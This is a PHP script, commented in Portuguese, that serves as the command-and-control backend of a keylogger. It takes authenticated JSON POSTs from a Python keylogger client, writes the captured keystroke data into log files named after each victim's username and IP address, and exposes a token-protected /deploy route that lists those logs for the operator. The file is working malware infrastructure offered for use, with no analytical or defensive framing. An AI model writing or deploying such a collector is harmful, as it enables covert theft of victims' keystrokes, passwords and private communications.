<?php
$AUTH_PASS = 'p0wned';
$PAYLOAD_DIR = __DIR__ . '/payloads';

header('Content-Type: application/json');

// ============================================
// ROTA DE ESCRITA (POST - Raiz) - PARA O KEYLOGGER
// ============================================
$script_path = $_SERVER['SCRIPT_NAME'];
if (strpos($script_path, '/deploy/') !== 0 && strpos($script_path, '/deploy') !== 0) {
    // Se NÃO estiver em /deploy, verifica se é POST
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Processa o POST do keylogger
        $rawData = file_get_contents('php://input');
        $payload = json_decode($rawData, true);
        
        // Validação específica para o formato do Python
        if (!$payload) {
            http_response_code(400);
            echo json_encode(['error' => 'Invalid JSON']);
            exit();
        }
        
        // Verifica autenticação
        if (!isset($payload['passwd']) || $payload['passwd'] !== $AUTH_PASS) {
            http_response_code(401);
            echo json_encode(['error' => 'Authentication failed']);
            exit();
        }
        
        // Verifica se é ping (teste de conexão)
        if (isset($payload['ping']) && $payload['ping'] === true) {
            echo json_encode(['status' => 'connected']);
            exit();
        }
        
        // Verifica se tem dados
        if (!isset($payload['Data']) || empty($payload['Data'])) {
            http_response_code(400);
            echo json_encode(['error' => 'No data provided']);
            exit();
        }
        
        // Cria diretório se não existir
        if (!is_dir($PAYLOAD_DIR)) {
            mkdir($PAYLOAD_DIR, 0755, true);
        }
        
        // Sanitiza os dados para o nome do arquivo
        $username = isset($payload['username']) ? preg_replace('/[^a-zA-Z0-9_-]/', '_', $payload['username']) : 'unknown';
        $ip = isset($payload['ip']) ? str_replace('.', '_', $payload['ip']) : 'unknown';
        $filename = "{$username}_{$ip}.log";
        
        // Prepara o conteúdo
        $timestamp = date('[d/m/Y] - H:i:s > ');
        $content = "---==\n" . $timestamp . $payload['Data'] . "\n";
        
        // Salva o arquivo
        $result = file_put_contents(
            $PAYLOAD_DIR . '/' . $filename,
            $content,
            FILE_APPEND | LOCK_EX
        );
        
        if ($result === false) {
            http_response_code(500);
            echo json_encode(['error' => 'Failed to write file']);
            exit();
        }
        
        // Resposta de sucesso (esperada pelo Python)
        echo json_encode(['status' => 'ok']);
        exit();
    }
    
    // Se não for POST e não estiver em /deploy
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

// ============================================
// ROTA DE LEITURA (/deploy) - Apenas GET
// ============================================
// Se chegou aqui, está em /deploy
if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

// Verifica autenticação para leitura
$auth_token = $_GET['token'] ?? null;
if ($auth_token !== 'p0wned_read' && $auth_token !== 'p0wned') {
    http_response_code(401);
    echo json_encode(['error' => 'Unauthorized']);
    exit();
}

// Lista os arquivos para leitura
if (!is_dir($PAYLOAD_DIR)) {
    echo json_encode(['status' => 'ok', 'files' => []]);
    exit();
}

$files = scandir($PAYLOAD_DIR);
$result = [];

foreach ($files as $file) {
    if ($file !== '.' && $file !== '..' && strpos($file, '.log') !== false) {
        $path = $PAYLOAD_DIR . '/' . $file;
        $result[] = [
            'name' => $file,
            'size' => filesize($path),
            'modified' => date('Y-m-d H:i:s', filemtime($path))
        ];
    }
}

echo json_encode(['status' => 'ok', 'files' => $result]);
?>
